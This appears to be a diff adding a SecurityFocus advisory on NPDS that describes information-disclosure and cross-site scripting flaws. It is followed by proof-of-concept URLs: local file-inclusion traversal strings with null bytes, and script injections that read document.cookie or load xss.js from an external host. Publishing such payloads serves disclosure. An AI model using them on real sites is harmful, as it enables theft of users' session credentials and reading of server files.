@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/18383/info
+
+NPDS is prone to multiple input-validation issues, including information-disclosure and cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input. 
+
+A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, or steal cookie-based authentication credentials. Other attacks are also possible.
+
+Local file-inclusion: 
+http://www.example.com/header.php?Default_Theme=../apache/logs/error.log%00 http://www.example.com/modules/cluster-paradise/cluster-E.php?ModPath=../../../../../apache/logs/error.log%00 
+Cross-site scripting: 
+http://www.example.com/header.php?Titlesitename=</title><script>alert(document.cookie)</script> http://www.example.com/header.php?sitename="><script>alert(document.cookie)</script> 
+http://www.example.com/meta/meta.php?nuke_url="><script>alert(document.cookie)</script> 
+http://www.example.com/viewforum.php?forum=2"><script src=http://www.example2.com/xss.js> 
+http://www.example.com/editpost.php?forum=1&post_id=888"><script src=http://www.example2.com/xss.js> http://www.example.com/editpost.php?forum=1"><script src=http://www.example2.com/xss.js> http://www.example.com/editpost.php?forum=1&topic="><script src=http://www.example2.com/xss.js> http://www.example.com/editpost.php?forum=1&arbre="><script src=http://www.example2.com/xss.js> http://www.example.com/user.php?op=only_newuser&uname="><script src=http://www.example2.com/xss.js> http://www.example.com/user.php?op=only_newuser&email="><script src=http://www.example2.com/xss.js>
